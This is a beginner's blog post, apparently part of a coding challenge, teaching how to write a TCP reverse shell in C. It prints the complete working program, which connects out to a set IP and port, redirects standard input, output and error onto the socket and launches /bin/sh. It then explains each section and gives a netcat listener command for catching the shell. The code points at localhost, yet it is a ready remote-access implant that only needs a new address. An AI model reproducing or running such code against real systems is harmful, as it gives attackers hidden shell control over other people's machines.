Hey! Today I went back to network programming and finished my first goal of the challenge, making a TCP reverse shell in C. Am I officially a hacker now?

As always, I recommend the [Beej's Guide to Network Programming](https://beej.us/guide/bgnet/) to learn about this. It doesn't teach how to develop a reverse shell directly, but it does teach everything you need to know to start this project yourself. But this blog post will be a tutorial for developing a reverse shell in C, if you want to go straight to the project.

The code looks like this: 

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#define PORT "3490"
#define IP "127.0.0.1"
#define TIMEOUT 2


int main(void){
    
    int sockfd;
    struct addrinfo hints, *servinfo, *p;
    
    memset(&hints, 0, sizeof(hints)); // initialize the settings
    // as 0s
    hints.ai_family = AF_UNSPEC; // IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM; // Stream socket/connection based
    
    int status;
    if((status = getaddrinfo(IP, PORT, &hints, &servinfo) != 0)){
        
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return 1;
    } // servinfo becomes a linked list with the host info

    for(int i = 0; i < 5; i++){

        for(p = servinfo; p != NULL; p = p->ai_next){
        // looping through the linked list

            if((sockfd = socket(p->ai_family, 
                            p->ai_socktype, 
                            p->ai_protocol)) == -1){
            // getting socket file descriptor

                perror("socket");
                continue; 
            }
            if(connect(sockfd, p->ai_addr, p->ai_addrlen) == -1){
            //  attempting to connect to the remote host

                close(sockfd);
                perror("connect");
                continue;
            }

            break;
        }

        if(p == NULL){
            
            fprintf(stderr, "failed to connect to %s:%s\n", IP, PORT);
            if(i==4) return 2;
            sleep(TIMEOUT);
            continue;
        }
    }
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", NULL, NULL);
}
```

If it looks complicated, don't worry, by the end of this post it won't be ;)

Let's walk through the various sections of the code. 

```
int sockfd;
struct addrinfo hints, *servinfo, *p;
    
memset(&hints, 0, sizeof(hints)); // initialize the settings
// as 0s
hints.ai_family = AF_UNSPEC; // IPv4 or IPv6
hints.ai_socktype = SOCK_STREAM; // Stream socket/connection based
    
int status;
if((status = getaddrinfo(IP, PORT, &hints, &servinfo) != 0)){
        
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
    return 1;
} // servinfo becomes a linked list with the host info
```

Here we specify certain settings of the connection we want to make to the host. AF_UNSPEC specifies that the connection can be both IPv4 or IPv6, and SOCK_STREAM specifies the type of socket we're going to use. If you want to learn this in more detail, read [day 5 post](/blog/100-days-day-5).

Then servinfo will become a linked list with the host info array (in case there is more than one type of connection possible). Now we have all the information we need to use socket functions. 

Now let's go to the main code logic.
```
for(p = servinfo; p != NULL; p = p->ai_next){
// looping through the linked list

    if((sockfd = socket(p->ai_family, 
                    p->ai_socktype, 
                    p->ai_protocol)) == -1){
    // getting socket file descriptor

        perror("socket");
        continue; 
    }
    if(connect(sockfd, p->ai_addr, p->ai_addrlen) == -1){
    //  attempting to connect to the remote host

        close(sockfd);
        perror("connect");
        continue;
    }

    break;
}
```

The socket function creates a socket! Very unexpected. We have to specify the family of the IP, the type of socket and the communication protocol. As we used getaddrinfo(), all of this is already on the linked list, so we don't have to worry about putting this information in by ourselves, it's all on p!

The socket function returns a file descriptor. In unix, every resource that handles input/output has an indentifier, which is called a file descriptor. (Keep in mind that even non-files have file descriptors, like network sockets.) To recieve input and send output, we need to do it through the file descriptor. So, whenever we make a operation relating to the socket we created, we will provide the file descriptor. 

As we are using a connection-based socket, the next step is to connect(). To do so, we provide the socket file descriptor, the address and the address length. If all goes well, we are basically done. I enclosed all of this in a for loop to try 5 times, if it doesn't work in 5 times, I end the program by returning the main.

Great, now that we estabilished the connection, we just need to do the reverse shell bit. 

```
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);

execve("/bin/sh", NULL, NULL);
```

dup2() is a function that duplicates the file descriptor. We provide the file descriptor we want to duplicate and the identifier we want to use. 0, 1 and 2 are the indentifiers of the stdin, stdout and stderr file descriptors, in order. So by making those indentifiers instead point to the socket file descriptor, whenever any program try to read the stdin or write to the stdout and stderr, it will instead read from the socket input and write to the socket output. 

Now that we have complete control over the input and output remotely, we just need to execute the shell with the execve() function. 

Success! You sucessfully learned how to make a reverse shell program in C! To test it, just start listening for connection in a terminal using netcat. The command is ```nc -lvp PORT```, as I specified the port 3490 I used ```nc -lvp 3490```. Now you just compile the client we just devloped in another terminal and run it. If all goes well, your netcat will recieve a connection, and you will be able to operate the shell through the terminal in which you used netcat.
